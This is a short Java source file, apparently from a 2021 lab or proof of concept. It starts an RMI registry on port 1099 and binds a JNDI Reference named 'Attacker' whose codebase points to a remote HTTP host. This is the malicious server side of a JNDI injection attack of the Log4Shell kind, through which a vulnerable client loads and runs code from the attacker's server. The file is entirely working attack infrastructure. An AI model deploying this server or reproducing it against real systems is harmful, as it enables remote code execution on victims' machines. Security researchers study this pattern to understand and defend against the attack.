import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @ClassName : server
 * @Description : 注册中心搭建
 * @Author : GC
 * @Date: 2021-12-11 15:37
 */
public class RmiServer {



    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, ClassNotFoundException {
        LocateRegistry.createRegistry(1099);

        Registry registry = LocateRegistry.getRegistry();
        System.out.println("rmi服务启动在1099端口");

        Reference reference = new Reference("Attacker", "Attacker", "http://127.0.0.1:80/");

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("attacker",referenceWrapper);

    }
}
